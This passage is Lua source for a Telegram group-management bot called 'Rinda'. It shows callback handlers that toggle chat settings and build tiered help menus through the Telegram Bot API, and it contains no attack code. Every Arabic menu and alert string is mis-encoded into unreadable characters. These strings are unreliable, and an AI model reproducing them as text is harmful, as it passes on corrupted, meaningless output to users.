if DataText and DataText:match('/LockAllRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockAllRed:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda..'Rio:Lock:AllRed'..data.chat_id_,true)
Text = "*โ๏ธฐุชุนุทู ุฑุฏูุฏ ุงููุทูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockAllRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockAllRed:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Lock:AllRed'..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุฑุฏูุฏ ุงููุทูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockGpRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda..'Rio:Lock:GpRed'..data.chat_id_,true)
Text = "*โ๏ธฐุชุนุทู ุฑุฏูุฏ ุงููุฏูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockGpRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Lock:GpRed'..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุฑุฏูุฏ ุงููุฏูุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockDelMe:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockDelMe:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Del:Me"..data.chat_id_, true)
Text = "*โ๏ธฐุชุนุทู ูุฒููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockDelMe:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockDelMe:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Del:Me"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ูุฒููู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockKickMe:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockKickMe:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Kick:Me"..data.chat_id_, true)
Text = "*โ๏ธฐุชุนุทู ุงุทุฑุฏูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockKickMe:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockKickMe:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Kick:Me"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงุทุฑุฏูู*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockKickBan:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockKickBan:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Lock:KickBan"..data.chat_id_,"true")
Text = "*โ๏ธฐุชุนุทู ุงูุญุธุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockKickBan:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockKickBan:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Lock:KickBan"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุญุธุฑ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockProSet:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockProSet:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda.."Rio:Lock:ProSet"..data.chat_id_,"true")
Text = "*โ๏ธฐุชุนุทู ุงูุฑูุน*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLocProSet:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLocProSet:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda.."Rio:Lock:ProSet"..data.chat_id_)
Text = "*โ๏ธฐุชูุนู ุงูุฑูุน*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/LockGames:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/LockGames:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:set(Rinda..'Rio:Lock:Games'..data.chat_id_,true)  
Text = "*โ๏ธฐุชุนุทู ุงูุงูุนุงุจ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText and DataText:match('/UnLockGames:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/UnLockGames:'..tonumber(data.sender_user_id_)..'(.*)')
DevRio:del(Rinda..'Rio:Lock:Games'..data.chat_id_) 
Text = "*โ๏ธฐุชูุนู ุงูุงูุนุงุจ*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_},{text="โข ุฑุฌูุน โข",callback_data="/lockorder:"..data.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/HideHelpList:(.*)') then
local Rio = DataText:match('/HideHelpList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุชู ูุนูเขชู ุฎููุช ฺชููุดู ุงูุงูุงูเขช") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local Rio = DataText:match('/HelpList:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Rinda..'Rio:Help')
local Text = [[
๐ง:ูููู ุจเขชู ุจูุงุฆูู ุงูุงูเขช เขชููุฏุง 
-----------------------------------------
โข๏ธฐุงูุงูเขช ุงูุญูุงูู
โข๏ธฐุงูุงูเขช ุงูุงุฏูููู
โข๏ธฐุงูุงูเขช ุงููุฏุฑุงุก
โข๏ธฐุงูุงูเขช ุงูููุดุฆูู
โข๏ธฐุงูุงูเขช ุงููุทูุฑูู
โข๏ธฐุงูุงูเขช ุงูุงุนุถุงุก
-----------------------------------------โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุฑุชุจ โข",callback_data="/DelList:"..data.sender_user_id_}},{{text="โข ุงูุชูุนูู ู ุงูุชุนุทูู โข",callback_data="/lockorder:"..data.sender_user_id_},{text="โข ุงูููู ู ุงููุชุญ โข",callback_data="/locklist:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local Rio = DataText:match('/HelpList1:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ููุณ ูุฏูู ุตูุงุญูุฉ ุงูุชุญูู ููุฐุง ุงูุงูุฑ .")..'&show_alert=true')
end
local Help = DevRio:get(Rinda..'Rio:Help1')
local Text = [[
โ๏ธฐุงูุงูุฑ ุญูุงูุฉ ุงููุฌููุนู โข โค
-----------------------------------------
โ๏ธฐููู โข ูุชุญ โข ุงูุฑูุงุจุท
โ๏ธฐููู โข ูุชุญ โข ุงููุนุฑูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูุจูุชุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููุชุญุฑูู
โ๏ธฐููู โข ูุชุญ โข ุงูููุตูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููููุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูุตูุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูููุฏูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงูููุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุฏุฑุฏุดู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูุฌูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงุบุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุตูุช
โ๏ธฐููู โข ูุชุญ โข ุงูุฌูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููุงุฑูุฏุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูุฑุงุฑ
โ๏ธฐููู โข ูุชุญ โข ุงููุงุดุชุงู
โ๏ธฐููู โข ูุชุญ โข ุงูุชุนุฏูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชุซุจูุช
โ๏ธฐููู โข ูุชุญ โข ุงูุงุดุนุงุฑุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูููุงูุด
โ๏ธฐููู โข ูุชุญ โข ุงูุฏุฎูู
โ๏ธฐููู โข ูุชุญ โข ุงูุดุจูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูููุงูุน
โ๏ธฐููู โข ูุชุญ โข ุงููุดุงุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูููุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูุทุงุฆููู
โ๏ธฐููู โข ูุชุญ โข ุงููู
โ๏ธฐููู โข ูุชุญ โข ุงูุนุฑุจูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงููููุฒูู
โ๏ธฐููู โข ูุชุญ โข ุงููุงุฑุณูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูููุด
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุญูุงูู ุงุฎุฑู โข โค
-----------------------------------------
โ๏ธฐููู โข ูุชุญ + ุงูุงูุฑ โข โค
โ๏ธฐุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ
โ๏ธฐุงูุชูุฑุงุฑ ุจุงููุชู
โ๏ธฐุงูุชูุฑุงุฑ ุจุงูุชููุฏ
โ๏ธฐุงููุงุฑุณูู ุจุงูุทุฑุฏ
โ๏ธฐุงูุจูุชุงุช ุจุงูุทุฑุฏ
โ๏ธฐุงูุจูุชุงุช ุจุงูุชููุฏ
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local Rio = DataText:match('/HelpList2:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ููุณ ูุฏูู ุตูุงุญูุฉ ุงูุชุญูู ููุฐุง ุงูุงูุฑ .")..'&show_alert=true')
end
local Help = DevRio:get(Rinda..'Rio:Help2')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูุงุฏูููู โข โค
-----------------------------------------
โ๏ธฐุงูุงุนุฏุงุฏุช
โ๏ธฐุชุงู ูููู 
โ๏ธฐุงูุดุงุก ุฑุงุจุท
โ๏ธฐุถุน ูุตู
โ๏ธฐุถุน ุฑุงุจุท
โ๏ธฐุถุน ุตูุฑู
โ๏ธฐุญุฐู ุงูุฑุงุจุท
โ๏ธฐูุดู ุงูุจูุชุงุช
โ๏ธฐุทุฑุฏ ุงูุจูุชุงุช
โ๏ธฐุชูุธูู + ุงูุนุฏุฏ
โ๏ธฐุชูุธูู ุงูุชุนุฏูู
โ๏ธฐููููู + ุงููููู
โ๏ธฐุงุณู ุงูุจูุช + ุงูุงูุฑ
โ๏ธฐุถุน โข ุญุฐู โข ุชุฑุญูุจ
โ๏ธฐุถุน โข ุญุฐู โข ููุงููู
โ๏ธฐุงุถู โข ุญุฐู โข ุตูุงุญูู
โ๏ธฐุงูุตูุงุญูุงุช โข ุญุฐู ุงูุตูุงุญูุงุช
-----------------------------------------
โ๏ธฐุถุน ุณุจุงู + ุงูุนุฏุฏ
โ๏ธฐุถุน ุชูุฑุงุฑ + ุงูุนุฏุฏ
-----------------------------------------
โ๏ธฐุฑูุน ูููุฒ โข ุชูุฒูู ูููุฒ
โ๏ธฐุงููููุฒูู โข ุญุฐู ุงููููุฒูู
โ๏ธฐูุดู ุงููููุฏ โข ุฑูุน ุงููููุฏ
-----------------------------------------
โ๏ธฐุญุฐู โข ูุณุญ + ุจุงูุฑุฏ
โ๏ธฐููุน โข ุงูุบุงุก ููุน
โ๏ธฐูุงุฆูู ุงูููุน
โ๏ธฐุญุฐู ูุงุฆูู ุงูููุน
-----------------------------------------
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุฑุงุจุท
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุงูุนุงุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุชุฑุญูุจ
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ุงูุชุงู ูููู
โ๏ธฐุชูุนูู โข ุชุนุทูู โข ูุดู ุงูุงุนุฏุงุฏุงุช
-----------------------------------------
โ๏ธฐุทุฑุฏ ุงููุญุฐูููู
โ๏ธฐุทุฑุฏ โข ุจุงูุฑุฏ โข ุจุงููุนุฑู โข ุจุงูุงูุฏู
โ๏ธฐูุชู โข ุงูุบุงุก ูุชู
โ๏ธฐุชููุฏ โข ุงูุบุงุก ุชููุฏ
โ๏ธฐุญุธุฑ โข ุงูุบุงุก ุญุธุฑ
โ๏ธฐุงูููุชูููู โข ุญุฐู ุงูููุชูููู
โ๏ธฐุงููููุฏูู โข ุญุฐู ุงููููุฏูู
โ๏ธฐุงููุญุธูุฑูู โข ุญุฐู ุงููุญุธูุฑูู
-----------------------------------------
โ๏ธฐุชูููุฏ ุฏูููู + ุนุฏุฏ ุงูุฏูุงุฆู
โ๏ธฐุชูููุฏ ุณุงุนู + ุนุฏุฏ ุงูุณุงุนุงุช
โ๏ธฐุชูููุฏ ููู + ุนุฏุฏ ุงูุงูุงู
โ๏ธฐุงูุบุงุก ุชูููุฏ โข ูุงูุบุงุก ุงูุชูููุฏ ุจุงูููุช
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
keyboard = {} 
if SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..data.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
elseif Admin(data) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="โข ุฑุฌูุน โข",callback_data="/HelpList:"..data.sender_user_id_}}}
end
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ุงูุงูุฑ ููุณ ูู .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local Rio = DataText:match('/HelpList3:(.*)')
if tonumber(Rio) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("โ ุนุฐุฑุง ููุณ ูุฏูู ุตูุงุญูุฉ ุงูุชุญูู ููุฐุง ุงูุงูุฑ .")..'&show_alert=true')
end
local Help = DevRio:get(Rinda..'Rio:Help3')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงููุฏุฑุงุก โข โค
-----------------------------------------
โ๏ธฐูุญุต ุงูุจูุช
โ๏ธฐุถุน ุงุณู + ุงูุงุณู
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ
โ๏ธฐุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธฐุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ
โ๏ธฐุงุถู โข ุญุฐู โข ุฑุฏ ูุชุนุฏุฏ
โ๏ธฐุญุฐู ุฑุฏ ูู ูุชุนุฏุฏ
โ๏ธฐุงูุฑุฏูุฏ ุงููุชุนุฏุฏู
โ๏ธฐุญุฐู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู
โ๏ธฐุญุฐู ููุงุฆู ุงูููุน
โ๏ธฐููุน โข ุจุงูุฑุฏ ุนูู ( ููุตู โข ุตูุฑู โข ูุชุญุฑูู )
โ๏ธฐุญุฐู ูุงุฆูู ููุน + โข โค
( ุงูุตูุฑ โข ุงููุชุญุฑูุงุช โข ุงูููุตูุงุช )
-----------------------------------------
โ๏ธฐุชูุฒูู ุงููู
โ๏ธฐุฑูุน ุงุฏูู โข ุชูุฒูู ุงุฏูู
โ๏ธฐุงูุงุฏูููู โข ุญุฐู ุงูุงุฏูููู
-----------------------------------------
โ๏ธฐุชุซุจูุช
โ๏ธฐุงูุบุงุก ุงูุชุซุจูุช
โ๏ธฐุงุนุงุฏู ุงูุชุซุจูุช
โ๏ธฐุงูุบุงุก ุชุซุจูุช ุงููู
-----------------------------------------
โ๏ธฐุชุบูุฑ ุฑุฏ + ุงุณู ุงูุฑุชุจู + ุงููุต โข โค
โ๏ธฐุงููุทูุฑ โข ููุดุฆ ุงูุงุณุงุณู
โ๏ธฐุงูููุดุฆ โข ุงููุฏูุฑ โข ุงูุงุฏูู
โ๏ธฐุงููููุฒ โข ุงูููุธู โข ุงูุนุถู
โ๏ธฐุญุฐู ุฑุฏูุฏ ุงูุฑุชุจ
-----------------------------------------
